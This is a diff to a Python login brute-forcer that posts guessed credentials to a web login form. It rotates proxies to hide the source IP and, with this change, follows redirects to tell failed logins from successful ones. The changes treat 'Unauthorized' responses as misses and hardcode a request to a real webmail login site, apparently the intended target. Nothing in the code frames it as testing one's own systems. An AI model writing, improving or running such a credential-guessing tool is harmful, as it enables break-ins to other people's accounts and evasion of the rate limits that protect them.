@@ -9,6 +9,19 @@ import urllib.request, urllib.error, urllib.response, urllib.parse
 from packages.config import *
 
 
+class MyHTTPRedirectHandler(urllib.request.HTTPRedirectHandler):
+    def __init__(self) -> None:
+        super().__init__()
+        self.redirects = []
+
+    def redirect_request(self, req, fp, code, msg, headers, newUrl):
+        self.redirects.append(headers["location"])
+        return super().redirect_request(req, fp, code, msg, headers, newUrl)
+
+    def get_redirects(self):
+        return self.redirects
+
+
 class Bruteforcer:
     def __init__(
         self,
@@ -67,6 +80,9 @@ class Bruteforcer:
             return variables_to_injection, credentials
 
         self.url = url
+        parse_url = urllib.parse.urlparse(self.url)
+        self.fail_url = ""
+        self.host = "{uri.scheme}://{uri.netloc}/".format(uri=parse_url)
         with open(data_scheme_file_raw, "r") as data_scheme_file:
             self.data_scheme = data_scheme_file.read().rstrip()
             if is_empty(self.data_scheme, data_scheme_file_raw):
@@ -104,7 +120,8 @@ class Bruteforcer:
             try:
                 index = self.proxy_rotating_injection(index, str.encode(data_to_post))
             except urllib.error.HTTPError as HTTPe:
-                if HTTPe.reason == "Bad Request":
+                print(HTTPe.code)
+                if HTTPe.reason in ["Bad Request", "Unauthorized"]:
                     print("[-] Incorrect credentials [-]")
                 else:
                     print(f"Exception: {HTTPe}")
@@ -155,7 +172,7 @@ class Bruteforcer:
                 try:
                     self.standard_injection(str.encode(data_to_post))
                 except urllib.error.HTTPError as HTTPe:
-                    if HTTPe.reason == "Bad Request":
+                    if HTTPe.reason in ["Bad Request", "Unauthorized"]:
                         print("[-] Incorrect credentials [-]")
                     else:
                         print(f"Exception: {HTTPe}")
@@ -168,28 +185,50 @@ class Bruteforcer:
         proxy_handler = urllib.request.ProxyHandler(
             {"http": self.proxies[index], "https": self.proxies[index]}
         )
-        opener = urllib.request.build_opener(proxy_handler)
+        opener = urllib.request.build_opener(
+            proxy_handler,
+        )
         opener.addheaders = [("User-agent", "Mozilla/5.0")]
+        opener.open("https://konto.onet.pl/")
         urllib.request.install_opener(opener)
         request = urllib.request.Request(self.url, data=data_bytes)
         with urllib.request.urlopen(request, timeout=10) as response:
             print(response.status)
-        if response.code in [200, 201]:
-            print(f"Correct credentials `{data_bytes}`")
-            sys.exit(0)
+        # if response.code in [200, 201]:
+        #     print(f"Correct credentials `{data_bytes}`")
+        #     sys.exit(0)
         return index
 
     def standard_injection(self, data_bytes):
         print(f"IP: Your IP, Data: `{data_bytes}`")
-        opener = urllib.request.build_opener()
-        opener.addheaders = [("User-agent", "Mozilla/5.0")]
+        redirect_handler = MyHTTPRedirectHandler()
+        opener = urllib.request.build_opener(redirect_handler)
+        # opener.addheaders = [("User-agent", "Mozilla/5.0")]
+        # opener.addheaders = [("Content-Type", "application/x-www-form-urlencoded")]
+        opener.addheaders = [("Referer", self.host)]
+        # opener.open("https://konto.onet.pl")
         urllib.request.install_opener(opener)
         request = urllib.request.Request(self.url, data=data_bytes)
         with urllib.request.urlopen(request, timeout=10) as response:
             print(response.status)
-        if response.code in [200, 201]:
-            print(f"Correct credentials `{data_bytes}`")
-            sys.exit(0)
+            redirects = redirect_handler.get_redirects()
+            print(redirects)
+            is_fail_url_match = True
+            if redirects and self.fail_url:
+                is_fail_url_match = (
+                    len([url for url in redirects if self.fail_url in url]) > 0
+                )
+                print(is_fail_url_match)
+            elif redirects and not self.fail_url:
+                is_fail_url_match = True  # ewidentnue
+            elif not redirects:
+                is_fail_url_match = False
+            # print(response.read())
+            if response.code in [200, 201] and not is_fail_url_match:
+                print(f"Correct credentials `{data_bytes}`")
+                sys.exit(0)
+            else:
+                print("[-] Incorrect credentials [-]")
 
 
 parser = argparse.ArgumentParser()
